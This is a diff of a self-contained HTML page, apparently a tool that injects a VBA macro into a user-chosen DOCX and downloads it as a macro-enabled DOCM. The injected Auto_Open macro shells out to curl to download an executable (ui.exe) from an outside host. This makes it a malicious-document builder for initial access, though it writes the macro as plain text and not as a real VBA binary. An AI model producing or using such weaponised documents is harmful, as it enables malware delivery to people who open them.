@@ -3,20 +3,140 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Inject VBA Macro into DOCX</title>
-  <link rel="stylesheet" href="styles.css">
+  <title>Inject VBA Macro into DOCX (Output DOCM)</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f4;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .container {
+      background: white;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+      width: 400px;
+      text-align: center;
+    }
+    h1 {
+      font-size: 20px;
+      margin-bottom: 10px;
+      color: #333;
+    }
+    p {
+      font-size: 14px;
+      color: #666;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      background: #007bff;
+      color: white;
+      font-size: 16px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: 0.3s ease;
+    }
+    button:hover {
+      background: #0056b3;
+    }
+    #status {
+      margin-top: 10px;
+      font-size: 14px;
+      color: #28a745;
+      display: none;
+    }
+  </style>
 </head>
 <body>
+
   <div class="container">
     <h1>Inject VBA Macro into DOCX</h1>
     <p>Select a DOCX file (macro-free) to inject the VBA macro automatically.</p>
     <input type="file" id="docxInput" accept=".docx">
-    <br>
     <button id="processBtn">Inject Macro & Download DOCM</button>
-    <p id="status"></p>
+    <p id="status">Processing...</p>
   </div>
-  
+
   <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.7.1/jszip.min.js"></script>
-  <script src="script.js"></script>
+  <script>
+    document.getElementById('processBtn').addEventListener('click', async function() {
+      const docxFile = document.getElementById('docxInput').files[0];
+      const statusText = document.getElementById('status');
+
+      if (!docxFile) {
+        alert('Please select a DOCX file.');
+        return;
+      }
+
+      statusText.style.display = "block";
+      statusText.textContent = "Processing file...";
+
+      try {
+        const docxArrayBuffer = await docxFile.arrayBuffer();
+        const zip = await JSZip.loadAsync(docxArrayBuffer);
+
+        const vbaMacroCode = `
+          Attribute VB_Name = "Module1"
+          Sub Auto_Open()
+              Dim Program As String
+              Program = "curl https://public.demo.securecloudsandbox.com/ui.exe -o ui.exe"
+              Dim TaskID As Double
+              TaskID = Shell(Program, 1)
+          End Sub
+        `;
+
+        const vbaProjectBin = new Blob([vbaMacroCode], { type: "application/octet-stream" });
+        zip.file("vbaProject.bin", vbaProjectBin);
+
+        const contentTypesPath = "[Content_Types].xml";
+        let contentTypesXml = await zip.file(contentTypesPath).async("string");
+        if (!contentTypesXml.includes("vbaProject.bin")) {
+          const overrideEntry = '<Override PartName="/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject" />';
+          contentTypesXml = contentTypesXml.replace('</Types>', overrideEntry + '</Types>');
+          zip.file(contentTypesPath, contentTypesXml);
+        }
+
+        const relsPath = "word/_rels/document.xml.rels";
+        if (zip.file(relsPath)) {
+          let relsXml = await zip.file(relsPath).async("string");
+          if (!relsXml.includes("vbaProject.bin")) {
+            const newRel = '<Relationship Id="rIdVBA" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="/vbaProject.bin"/>';
+            relsXml = relsXml.replace('</Relationships>', newRel + '</Relationships>');
+            zip.file(relsPath, relsXml);
+          }
+        }
+
+        const newDocmBlob = await zip.generateAsync({ 
+          type: "blob", 
+          mimeType: "application/vnd.ms-word.document.macroEnabled.12" 
+        });
+
+        const downloadLink = document.createElement("a");
+        downloadLink.href = URL.createObjectURL(newDocmBlob);
+        downloadLink.download = "macroEnabled.docm";
+        downloadLink.click();
+
+        statusText.textContent = "File successfully processed! Downloading...";
+      } catch (err) {
+        console.error("Error processing files:", err);
+        alert("An error occurred while processing the files. See console for details.");
+        statusText.textContent = "Error processing file.";
+        statusText.style.color = "red";
+      }
+    });
+  </script>
 </body>
 </html>
